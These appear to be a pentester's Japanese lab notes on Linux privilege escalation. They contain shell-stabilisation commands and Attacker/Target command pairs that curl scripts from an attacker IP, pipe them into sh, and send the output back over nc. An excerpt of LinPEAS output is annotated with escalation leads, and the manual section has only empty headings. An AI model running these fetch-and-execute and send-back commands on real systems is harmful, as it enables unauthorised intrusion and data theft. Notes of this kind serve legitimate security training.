# シェルの安定化

※penelopeでシェル獲得できた場合は不要
```zsh
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm-256color
# Ctrl + Z
stty raw -echo; fg
```

---

# Auto 

## unix-privesc-check

### 転送・実行

```zsh
# Attacker
cp /usr/bin/unix-privesc-check .
python -m http.server 8888
nc -lvnp 9002 | tee unix-privesc-check.out
```
```zsh
# Target
curl 192.168.45.182:8888/unix-privesc-check | sh -s standard | nc -q 0 192.168.45.182 9002
```

### 実行結果抽出 -> 実行失敗



---

## LinPEAS

### 転送・実行

```zsh
# Attacker
cp /usr/share/peass/linpeas/linpeas.sh .
python -m http.server 8888
nc -lvnp 9002 | tee linpeas.out
```
```zsh
# Target
curl 192.168.45.182:8888/linpeas.sh | sh | nc -q 0 192.168.45.182 9002
```

### 実行結果抽出

```powershell
# rootがapacheを動作させているので、LFIさせられれば、root に権限昇格
╔══════════╣ Running processes (cleaned)
╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                               

root      1402  0.0  2.5 492324 26028 ?        Ss   00:04   0:00 /usr/sbin/apache2 -k start

# mdadmという見慣れないcron
══╣ Cron jobs list                                                            
/usr/bin/crontab                                                              
incrontab Not Found
-rw-r--r-- 1 root root     722 Nov 16  2017 /etc/crontab                      

/etc/cron.d:
total 24
drwxr-xr-x   2 root root 4096 May 17  2021 .
drwxr-xr-x 102 root root 4096 May 27  2021 ..
-rw-r--r--   1 root root  102 Nov 16  2017 .placeholder
-rw-r--r--   1 root root  589 Mar  7  2018 mdadm


# rootによって実行されているapacheのファイルが書き換え可能かもしれない
╔══════════╣ Systemd Information
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-                      
═╣ Systemd version and vulnerabilities? .............. ═╣ Services running as root? .....                                                                       
═╣ Running services with dangerous capabilities? ... 
═╣ Services with writable paths? . apache2.service: Uses relative path 'start' (from ExecStart=/usr/sbin/apachectl start)
mariadb.service: Uses relative path 'ExecStartPre=/usr/bin/mysql_install_db' (from # ExecStartPre=/usr/bin/mysql_install_db -u mysql)
mariadb.service: Uses relative path '$MYSQLD_OPTS' (from ExecStart=/usr/sbin/mysqld $MYSQLD_OPTS $_WSREP_NEW_CLUSTER $_WSREP_START_POSITION)
mariadb.service: Uses relative path 'ExecStartPre=sync' (from # ExecStartPre=sync)
mariadb.service: Uses relative path 'ExecStartPre=sysctl' (from # ExecStartPre=sysctl -q -w vm.drop_caches=3)
mariadb.service: Uses relative path 'Change' (from # Change ExecStart=numactl --interleave=all /usr/sbin/mysqld......)
networkd-dispatcher.service: Uses relative path '$networkd_dispatcher_args' (from ExecStart=/usr/bin/networkd-dispatcher $networkd_dispatcher_args)
rsyslog.service: Uses relative path '-n' (from ExecStart=/usr/sbin/rsyslogd -n)


```

---
---

# Manual

## ユーザー


---

## システム情報


---

## 実行中のプロセス


---

## ネットワーク


---

## Cron


---

## インストール済みアプリケーション


---

## アクセス制限が不十分なファイル/ディレクトリ


---

## マウントされていないドライブ


---

## 高権限をもつバイナリの列挙



---

## システムデーモン



---

## 共有フォルダ、SNMP情報


---

## 興味深い情報


---

## デバイスドライバ・カーネルモジュール



